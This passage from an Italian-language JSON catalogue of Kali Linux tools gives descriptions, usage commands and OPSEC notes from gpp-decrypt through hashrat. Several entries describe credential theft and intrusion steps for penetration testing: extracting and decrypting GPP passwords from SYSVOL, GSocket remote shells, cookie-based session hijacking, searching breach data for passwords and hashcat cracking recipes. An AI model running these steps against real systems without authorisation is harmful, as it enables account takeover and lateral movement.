    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Gpp-decrypt</strong> è un tool specializzato per decriptare password memorizzate nelle Group Policy Preferences (GPP) di Active Directory. Prima della patch MS14-025, gli amministratori potevano configurare password di account locali, mappature drive e task schedulati tramite GPP, con le password \"protette\" da cifratura AES-256. Il problema: Microsoft pubblicò la chiave AES nella documentazione MSDN, rendendo questa \"protezione\" completamente inutile. Qualsiasi utente di dominio può leggere SYSVOL e decriptare queste password. Nonostante la patch del 2014, ambienti legacy spesso contengono ancora GPP vulnerabili con password di local admin.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>AES-256 Decryption:</strong> decripta istantaneamente il campo cpassword usando la chiave AES pubblicata da Microsoft, rivelando la password in chiaro senza necessità di brute force o risorse computazionali.</p><p><strong>Simple CLI Input:</strong> accetta direttamente la stringa cpassword codificata in Base64 trovata nei file XML di GPP, senza necessità di preprocessing o estrazione manuale.</p><p><strong>Instant Results:</strong> la decryption è istantanea - non c'è cracking coinvolto, solo decifratura con chiave nota, restituendo immediatamente la password originale.</p><p><strong>Universal Compatibility:</strong> funziona con tutte le password GPP indipendentemente dalla complessità, lunghezza o caratteri speciali - la chiave è sempre la stessa.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Decripta cpassword trovata in file GPP\ngpp-decrypt \"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\"\n\n# Dove trovare cpassword - file XML in SYSVOL:\n# \\\\domain\\SYSVOL\\domain\\Policies\\{GUID}\\Machine\\Preferences\\Groups\\Groups.xml\n# \\\\domain\\SYSVOL\\domain\\Policies\\{GUID}\\User\\Preferences\\Drives\\Drives.xml\n# \\\\domain\\SYSVOL\\domain\\Policies\\{GUID}\\Machine\\Preferences\\Services\\Services.xml\n# \\\\domain\\SYSVOL\\domain\\Policies\\{GUID}\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml\n# \\\\domain\\SYSVOL\\domain\\Policies\\{GUID}\\Machine\\Preferences\\DataSources\\DataSources.xml\n\n# Cerca tutti i cpassword in SYSVOL da Windows\nfindstr /S /I cpassword \\\\dc01.domain.local\\sysvol\\*.xml\n\n# Da Linux con mount SMB\ngrep -r cpassword /mnt/sysvol/\n\n# Workflow automatizzato con PowerSploit\nImport-Module .\\PowerSploit.ps1\nGet-GPPPassword\n\n# Metasploit module\nuse post/windows/gather/credentials/gpp</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Active Directory Penetration Testing</strong>, dopo aver ottenuto accesso come utente di dominio, cercare password GPP è uno dei primi passi - spesso rivela password di local administrator identiche su molte macchine.</p><p>Per <strong>Privilege Escalation</strong>, le password GPP tipicamente configurano account local admin, permettendo escalation da domain user a local admin su workstation e server.</p><p>Per <strong>Lateral Movement</strong>, se la stessa password local admin è usata su più macchine (password reuse comune), una singola GPP decriptata può dare accesso a centinaia di sistemi.</p><p>Per <strong>Legacy Environment Assessment</strong>, verificare se ambienti non aggiornati o migrati da versioni precedenti di Windows contengono ancora GPP vulnerabili con password esposte.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Patch Status:</strong> MS14-025 (maggio 2014) ha impedito la CREAZIONE di nuove GPP con password, ma NON rimuove quelle esistenti. Ambienti legacy, domini migrati da Windows 2003/2008 o con GPO mai pulite possono ancora contenere cpassword decriptabili. L'accesso a SYSVOL è consentito a tutti gli utenti di dominio autenticati - non richiede privilegi elevati. Tool come PowerSploit (Get-GPPPassword) automatizzano completamente la ricerca e decryption.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "graudit",
    "name": "graudit",
    "version": "3.8",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/graudit/",
    "desc": "Static code analysis con grep per trovare vulnerabilità comuni nel codice sorgente.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Graudit</strong> è un tool di static code analysis che usa grep per trovare vulnerabilità comuni nel codice sorgente. Include database di signature per vari linguaggi (PHP, Python, Java, C, etc.) che identificano pattern vulnerabili come SQL injection, XSS, command injection.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Language:</strong> Signature per PHP, Python, Java, C, JS, etc.</p><p><strong>Pattern Matching:</strong> Usa grep per ricerca veloce.</p><p><strong>Custom Rules:</strong> Aggiungi signature personalizzate.</p><p><strong>Lightweight:</strong> Nessuna dipendenza complessa.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan codice PHP\ngraudit -d php /path/to/code/\n\n# Codice Python\ngraudit -d python /path/to/code/\n\n# Tutti i linguaggi\ngraudit -d all /path/to/code/\n\n# Lista database disponibili\ngraudit -l</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Code Review</strong>, primo pass automatizzato su codebase.</p><p>Nel <strong>Bug Bounty</strong>, analisi rapida di codice open source.</p><p><strong>DevSecOps</strong> per scansione veloce in pipeline.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>False Positives:</strong> Pattern matching genera falsi positivi. Richiede review manuale dei risultati. Complementa con tool più sofisticati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "gsocket",
    "name": "gsocket",
    "version": "1.4.43",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/gsocket/",
    "desc": "Connessione diretta tra host dietro NAT/firewall senza port forwarding tramite relay.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>GSocket</strong> (Global Socket) permette connessioni dirette tra host dietro NAT o firewall senza necessità di port forwarding. Usa un relay server per stabilire la connessione iniziale, poi passa a comunicazione diretta. Supporta SSH, reverse shell, file transfer e port forwarding.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>NAT Traversal:</strong> Connette host dietro NAT senza port forward.</p><p><strong>Encrypted:</strong> Comunicazione cifrata end-to-end.</p><p><strong>Relay Fallback:</strong> Usa relay se P2P non possibile.</p><p><strong>SSH/Shell:</strong> Shell interattiva e SSH over GSocket.</p><p><strong>File Transfer:</strong> Trasferimento file integrato.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Genera secret condiviso\ngs-netcat -g\n\n# Lato server (listener)\ngs-netcat -l -s SECRET\n\n# Lato client (connector)\ngs-netcat -s SECRET\n\n# Port forwarding\ngs-netcat -l -s SECRET -p 8080:localhost:80</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Remote Access</strong>, accedi a macchine dietro NAT.</p><p>Nel <strong>Red Team</strong>, mantieni accesso senza aprire porte.</p><p><strong>Troubleshooting</strong> per supporto remoto senza VPN.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Relay Traffic:</strong> Il relay potrebbe vedere metadati. Per massima sicurezza, usa relay self-hosted.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "guymager",
    "name": "guymager",
    "version": "0.8.13",
    "icon": "../app/icons/guymager-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/guymager/",
    "desc": "GUI forense per acquisizione immagini disco con hashing, compressione e log chain.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Guymager</strong> è un tool forense con GUI per acquisizione di immagini disco forensi. Supporta formati dd raw, EWF (EnCase) e AFF con hashing parallelo MD5/SHA per verifica integrità. Ottimizzato per velocità con I/O asincrono e multi-threading.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multiple Formats:</strong> dd, EWF/E01, AFF output.</p><p><strong>Parallel Hashing:</strong> Calcola MD5 e SHA simultaneamente.</p><p><strong>Compression:</strong> Compressione integrata per EWF/AFF.</p><p><strong>Verification:</strong> Verifica automatica post-acquisizione.</p><p><strong>Log Generation:</strong> Log dettagliato per chain of custody.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia GUI\nguymager\n\n# Seleziona dispositivo sorgente\n# Tasto destro -> Acquire image\n# Scegli formato (Expert Witness preferito per forensics)\n# Specifica destinazione e info caso\n# Avvia acquisizione</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Digital Forensics</strong>, acquisizione forense di dischi.</p><p>Nel <strong>Incident Response</strong>, crea immagini per analisi.</p><p><strong>Chain of Custody</strong> con log e hash verificabili.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Best Practice:</strong> Usa write blocker hardware. Documenta tutto per chain of custody. Verifica sempre hash post-acquisizione.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "gvm",
    "name": "gvm",
    "version": "25.04.0",
    "icon": "../app/icons/gvm-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/gvm/",
    "desc": "Greenbone Vulnerability Management, scanner di vulnerabilità enterprise open source.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>GVM</strong> (Greenbone Vulnerability Management, ex OpenVAS) è una piattaforma di vulnerability scanning enterprise open source. Include scanner di rete, database di vulnerabilità aggiornato (NVT), gestione asset, scheduling scan e reporting. Alternativa open source a Nessus/Qualys.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Network Scanner:</strong> Scansione completa di vulnerabilità di rete.</p><p><strong>NVT Database:</strong> 50,000+ test di vulnerabilità aggiornati.</p><p><strong>Asset Management:</strong> Gestisce inventario asset.</p><p><strong>Scheduled Scans:</strong> Scansioni programmate automatiche.</p><p><strong>Compliance Checks:</strong> Verifica compliance standard.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Setup iniziale\ngvm-setup\n\n# Avvia servizi\ngvm-start\n\n# Accedi alla web interface\n# https://localhost:9392\n# admin / (password generata)\n\n# Crea target, configura scan, esegui\n# Analizza report generato</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Vulnerability Assessment</strong>, scan completi di infrastruttura.</p><p>Nel <strong>Compliance</strong>, verifica aderenza a standard.</p><p><strong>Continuous Monitoring</strong> con scan schedulati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Resource Intensive:</strong> Richiede risorse significative. Scan possono essere disruptivi. Coordina con operations prima di scansionare.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "h8mail",
    "name": "h8mail",
    "version": "2.5.6",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/h8mail/",
    "desc": "Email OSINT tool per trovare password leakate in breach database e paste site.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>H8mail</strong> è un tool OSINT per email che cerca password e credenziali associate a indirizzi email in database di breach e paste site. Interroga servizi come HaveIBeenPwned, Hunter.io, Snusbase e altri per trovare leak associati a un'email target.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Source:</strong> Cerca in HIBP, breach compilations, paste sites.</p><p><strong>API Integration:</strong> Supporta chiavi API per servizi premium.</p><p><strong>Bulk Search:</strong> Processa liste di email.</p><p><strong>Local Breach:</strong> Cerca in database di breach locali.</p><p><strong>Export:</strong> Output in vari formati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Cerca singola email\nh8mail -t target@email.com\n\n# Lista di email\nh8mail -t emails.txt\n\n# Con API keys configurate\nh8mail -t target@email.com -c config.ini\n\n# Cerca in breach locale\nh8mail -t target@email.com -lb breach.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>OSINT</strong>, verifica se credenziali sono state leakate.</p><p>Nel <strong>Red Team</strong>, trova password per password spraying.</p><p><strong>Security Awareness</strong> mostra rischi di password riutilizzate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>API Limits:</strong> Servizi gratuiti hanno rate limiting. API premium costano. Dati di breach possono essere datati.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Email_Harvesting"
    ],
    "notes": null
  },
  {
    "id": "hak5-wifi-coconut",
    "name": "hak5-wifi-coconut",
    "version": "1.1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hak5-wifi-coconut/",
    "desc": "Driver e tool per WiFi Coconut Hak5 con 14 radio per cattura simultanea su tutti i canali.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Hak5 WiFi Coconut è un tool hardware/software con 14 radio WiFi che permette cattura simultanea su tutti i canali 2.4GHz. Il pacchetto include driver e utility per gestire le 14 interfacce wireless parallele, ideale per catturare handshake senza dover fare channel hopping.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>14 Radio:</strong> Monitora tutti i canali 2.4GHz simultaneamente.</p><p><strong>No Channel Hopping:</strong> Cattura completa senza perdere pacchetti.</p><p><strong>Airodump Integration:</strong> Funziona con aircrack-ng suite.</p><p><strong>USB Connection:</strong> Singola connessione USB per tutte le radio.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Verifica hardware\nwifi_coconut status\n\n# Avvia tutte le interfacce in monitor mode\nwifi_coconut setup\n\n# Usa con airodump-ng\nairodump-ng wlan0mon wlan1mon wlan2mon ...\n\n# Cattura completa su tutti i canali</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>WiFi Assessment</strong>, cattura handshake su qualsiasi canale.</p><p>Nel <strong>Wireless Survey</strong>, mappa tutte le reti simultaneamente.</p><p><strong>Research</strong> su traffico WiFi senza perdite.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Hardware Required:</strong> Richiede hardware Hak5 WiFi Coconut (~100$). 14 interfacce possono essere riconosciute.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "WiFi"
    ],
    "notes": null
  },
  {
    "id": "hamster-sidejack",
    "name": "hamster-sidejack",
    "version": "2.0",
    "icon": "../app/icons/hamster-sidejack-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hamster-sidejack/",
    "desc": "Tool per session hijacking che usa cookie catturati da ferret per impersonare utenti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Hamster è un proxy HTTP per session hijacking che usa cookie catturati da Ferret per impersonare sessioni web. Crea un proxy locale dove puoi navigare come la vittima usando i cookie di sessione catturati dal traffico di rete non cifrato.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Session Replay:</strong> Usa cookie catturati per impersonare sessioni.</p><p><strong>Proxy Server:</strong> Proxy HTTP locale per navigazione.</p><p><strong>Ferret Integration:</strong> Legge cookie catturati da Ferret.</p><p><strong>Web Interface:</strong> Interfaccia per selezionare sessioni.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Prima cattura cookie con Ferret\nferret -i eth0\n\n# Poi avvia Hamster\nhamster\n\n# Configura browser per usare proxy localhost:1234\n# Naviga su http://hamster per selezionare sessione\n# Click su sessione desiderata per impersonare</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Session Hijacking</strong>, impersona utenti su reti non cifrate.</p><p>Nel <strong>WiFi Testing</strong>, dimostra rischi di reti aperte.</p><p><strong>Awareness</strong> sull'importanza di HTTPS.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Limitato:</strong> Non funziona con HTTPS. Richiede posizione MITM. Tool storico, meno utile su internet moderno con HTTPS ovunque.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Proxy_MITM"
    ],
    "notes": null
  },
  {
    "id": "hash-identifier",
    "name": "hash-identifier",
    "version": "1.2",
    "icon": "../app/icons/hash-identifier-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hash-identifier/",
    "desc": "Identifica il tipo di algoritmo hash analizzando formato e lunghezza del digest.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Hash-identifier</strong> è un tool Python per identificare il tipo di algoritmo hash analizzando formato, lunghezza e caratteristiche del digest. Utile quando trovi un hash e devi capire quale algoritmo usare per il cracking. Supporta i tipi di hash più comuni.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Auto Detection:</strong> Identifica algoritmo da caratteristiche hash.</p><p><strong>Multiple Matches:</strong> Suggerisce più possibili algoritmi.</p><p><strong>Common Hashes:</strong> MD5, SHA, MySQL, bcrypt, etc.</p><p><strong>Interactive:</strong> Input interattivo dell'hash.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia interattivamente\nhash-identifier\n\n# Inserisci hash quando richiesto\nEnter hash: 5d41402abc4b2a76b9719d911017c592\n\n# Output: Possible Hashs:\n#   MD5\n#   MD4\n#   Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Hash Cracking</strong>, identifica algoritmo prima di usare hashcat/john.</p><p>Nel <strong>CTF</strong>, riconosci velocemente tipo di hash.</p><p><strong>Forensics</strong> per analizzare hash trovati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Alternative:</strong> hashid è più completo con 220+ algoritmi e suggerimenti hashcat mode. Tool complementari.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Cracking"
    ],
    "notes": null
  },
  {
    "id": "hashcat-utils",
    "name": "hashcat-utils",
    "version": "1.9",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hashcat-utils/",
    "desc": "Utility per hashcat: conversione capture, rule generation, wordlist manipulation.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Hashcat-utils</strong> è una collezione di utility per supportare hashcat nel password cracking. Include tool per conversione di capture WiFi, generazione di regole, manipolazione wordlist, combinazione di dizionari e preparazione di file per cracking ottimizzato.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>cap2hccapx:</strong> Converte capture .cap in formato hashcat.</p><p><strong>combinator:</strong> Combina due wordlist in tutte le permutazioni.</p><p><strong>maskprocessor:</strong> Genera wordlist da mask pattern.</p><p><strong>rule utilities:</strong> Tool per creare e testare regole.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Converti capture WiFi\ncap2hccapx capture.cap output.hccapx\n\n# Combina wordlist\ncombinator wordlist1.txt wordlist2.txt > combined.txt\n\n# Genera da mask\nmaskprocessor ?l?l?l?l > 4letters.txt\n\n# Split per dimensione\nsplitlen 8 wordlist.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>WiFi Cracking</strong>, prepara capture per hashcat.</p><p>Nel <strong>Wordlist Generation</strong>, crea dizionari custom.</p><p><strong>Rule Development</strong> per ottimizzare cracking.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Preprocessing:</strong> Tool di preparazione, non generano traffico. Ottimizza wordlist prima del cracking per risparmiare tempo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Cracking"
    ],
    "notes": null
  },
  {
    "id": "hashcat",
    "name": "hashcat",
    "version": "6.2.6",
    "icon": "../app/icons/hashcat-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hashcat/",
    "desc": "Password cracker GPU più veloce al mondo con supporto per 350+ tipi di hash e regole.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Hashcat</strong> è il password cracker più veloce al mondo, sfruttando GPU per performance estreme. Supporta oltre 350 tipi di hash, attack modes multipli (dictionary, brute-force, combinator, rule-based, mask) e regole per manipolazione password. Standard de facto per password cracking professionale.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>GPU Acceleration:</strong> Sfrutta CUDA/OpenCL per velocità massima.</p><p><strong>350+ Hash Types:</strong> MD5, SHA, bcrypt, WPA, NTLM, Kerberos, etc.</p><p><strong>Attack Modes:</strong> Dictionary, brute-force, combination, hybrid, mask.</p><p><strong>Rules Engine:</strong> Regole potenti per mutazione password.</p><p><strong>Distributed:</strong> Supporta cracking distribuito.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Dictionary + rules per massima coverage NTLM\nhashcat -m 1000 ntlm_hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule \\\n  -r /usr/share/hashcat/rules/toggles1.rule --force -O\n\n# Mask attack: Company + Anno + Simbolo (Corporate passwords)\nhashcat -m 1000 hashes.txt -a 3 'Company?d?d?d?d?s' --increment --increment-min 10\n\n# Combinator: due wordlist concatenate\nhashcat -m 0 hashes.txt -a 1 wordlist1.txt wordlist2.txt\n\n# Kerberoast con ottimizzazione GPU\nhashcat -m 13100 kerberoast.txt wordlist.txt -O -w 3 --hwmon-temp-abort=90\n\n# WPA/WPA2 PMKID con session restore\nhashcat -m 22000 capture.hc22000 wordlist.txt --session=wifi_crack\nhashcat --restore --session=wifi_crack  # riprendi dopo interruzione\n\n# AS-REP Roasting\nhashcat -m 18200 asrep_hashes.txt wordlist.txt -r rules/InsidePro-PasswordsPro.rule\n\n# Hybrid: wordlist + mask suffix\nhashcat -m 1000 hashes.txt -a 6 wordlist.txt '?d?d?d?s'\n\n# Show cracked passwords\nhashcat -m 1000 hashes.txt wordlist.txt --show --outfile-format=2</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Password Cracking</strong>, cracka qualsiasi tipo di hash.</p><p>Nel <strong>Pentest</strong>, verifica strength delle password.</p><p><strong>WiFi Cracking</strong> per handshake WPA/WPA2.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Local Only:</strong> Cracking avviene localmente, nessun traffico di rete. Richiede GPU potente per performance ottimali. Cloud GPU disponibili per hash complessi.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Cracking"
    ],
    "notes": null
  },
  {
    "id": "hashdeep",
    "name": "hashdeep",
    "version": "4.4",
    "icon": "../app/icons/hashdeep-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hashdeep/",
    "desc": "Calcola hash ricorsivamente e verifica integrità file con audit mode per forensics.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Hashdeep</strong> è un tool forense per calcolare hash ricorsivamente su directory e verificare integrità di file. Supporta MD5, SHA-1, SHA-256 e altri algoritmi. Include audit mode per confrontare hash attuali con baseline nota, identificando file modificati, aggiunti o rimossi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Recursive Hashing:</strong> Calcola hash di intere directory.</p><p><strong>Multiple Algorithms:</strong> MD5, SHA-1, SHA-256, Tiger, Whirlpool.</p><p><strong>Audit Mode:</strong> Confronta con baseline per trovare modifiche.</p><p><strong>Matching Mode:</strong> Cerca file con hash specifici.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Genera baseline di hash\nhashdeep -r /path/to/directory > baseline.txt\n\n# Verifica integrità (audit)\nhashdeep -r -a -k baseline.txt /path/to/directory\n\n# Solo SHA-256\nhashdeep -r -c sha256 /path/to/evidence/\n\n# Cerca file matching\nhashdeep -r -m -k known_hashes.txt /suspect/</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Digital Forensics</strong>, verifica integrità evidenze.</p><p>Nel <strong>Incident Response</strong>, trova file modificati.</p><p><strong>Compliance</strong> per audit integrità sistema.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Read-Only:</strong> Solo lettura, non modifica file. Crea baseline PRIMA di analizzare per confronto valido.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "hashid",
    "name": "hashid",
    "version": "3.1.4",
    "icon": "../app/icons/hashid-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hashid/",
    "desc": "Identifica oltre 220 tipi di hash e suggerisce il modulo hashcat corrispondente.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>HashID</strong> identifica oltre 220 tipi di hash e suggerisce direttamente il modulo hashcat (-m) e john format corrispondente. Più completo di hash-identifier, è il tool preferito per identificare algoritmi hash sconosciuti prima del cracking.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>220+ Algorithms:</strong> Identifica moltissimi tipi di hash.</p><p><strong>Hashcat Mode:</strong> Suggerisce direttamente il parametro -m.</p><p><strong>John Format:</strong> Indica il format per John the Ripper.</p><p><strong>Batch Mode:</strong> Processa file con più hash.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Identifica singolo hash\nhashid '5d41402abc4b2a76b9719d911017c592'\n\n# Con moduli hashcat e john\nhashid -m -j '5d41402abc4b2a76b9719d911017c592'\n\n# Da file\nhashid -m hashes.txt\n\n# Output esteso\nhashid -e '$2a$10$...'</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Hash Cracking</strong>, identifica tipo prima di usare hashcat.</p><p>Nel <strong>CTF</strong>, riconosci algoritmi velocemente.</p><p><strong>Pentest</strong> per capire come sono hash ate le password.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Offline:</strong> Analisi locale, nessuna connessione di rete. Alcuni hash sono ambigui, prova più moduli hashcat se necessario.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Cracking"
    ],
    "notes": null
  },
  {
    "id": "hashrat",
    "name": "hashrat",
    "version": "1.25",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/hashrat/",
    "desc": "Calcola e verifica hash di file con supporto per algoritmi multipli e CGI mode.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>HashRat</strong> è uno strumento versatile per il calcolo e la verifica di hash crittografici su file e directory. A differenza delle utility standard come md5sum o sha256sum, offre funzionalità avanzate come hashing ricorsivo, verifica batch, output in formati multipli, modalità CGI per integrazione web, e supporto per algoritmi moderni. È particolarmente utile in contesti forensi dove la documentazione dell'integrità dei file è critica.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multiple Hash Algorithms:</strong> Supporta una vasta gamma di algoritmi: MD5, SHA-1, SHA-256, SHA-512, Whirlpool, RIPEMD, e varianti HMAC. Permette di calcolare hash multipli simultaneamente per conformità a diversi standard forensi.</p><p><strong>Recursive Directory Hashing:</strong> Calcola hash di intere strutture di directory in modo ricorsivo, generando un manifest completo di tutti i file con i relativi hash. Supporta filtri per escludere pattern o estensioni specifiche.</p><p><strong>Verification Mode:</strong> Verifica l'integrità di file confrontando gli hash attuali con quelli precedentemente salvati in un file di controllo. Segnala file modificati, mancanti, o aggiunti - essenziale per chain of custody in contesti forensi.</p><p><strong>CGI Web Mode:</strong> Può essere eseguito come script CGI, permettendo il calcolo di hash tramite interfaccia web. Utile per servizi interni di verifica file o integrazione in workflow automatizzati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>HashRat si usa da riga di comando con opzioni intuitive per algoritmo e modalità operativa.</p><pre><code># Hash MD5 di un singolo file (default)\nhashrat file.txt\n\n# Hash SHA-256\nhashrat -sha256 file.txt\n\n# Hash SHA-512 di directory ricorsivamente\nhashrat -sha512 -r /evidence/disk_image/\n\n# Genera file di controllo per verifica futura\nhashrat -sha256 -r /evidence/ > evidence_hashes.txt\n\n# Verifica integrità contro hash salvati\nhashrat -c evidence_hashes.txt\n\n# Output in formato specificato (trad, bsd, coreutils)\nhashrat -sha256 -trad file.txt\n\n# HMAC con chiave\nhashrat -sha256 -hmac -k secret_key file.txt</code></pre><p>L'output può essere rediretto a file per documentazione forense o confronto successivo.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Digital Forensics</strong>, HashRat è fondamentale per stabilire e documentare la chain of custody, calcolando hash di evidence al momento dell'acquisizione e verificandoli in fasi successive dell'investigazione.</p><p>Per <strong>File Integrity Monitoring</strong>, può essere usato per creare baseline di sistemi e verificare periodicamente che i file critici non siano stati modificati.</p><p>Durante <strong>Incident Response</strong>, permette di identificare rapidamente file modificati o aggiunti confrontando lo stato attuale con baseline precedenti.</p><p>Per <strong>Download Verification</strong>, verifica che file scaricati da internet corrispondano agli hash pubblicati, prevenendo l'esecuzione di file corrotti o manomessi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Uso Legittimo:</strong> HashRat è una utility di sistema standard senza implicazioni di sicurezza negative. Non modifica i file esaminati ed è puramente passivo.</p><p><strong>Limitazioni 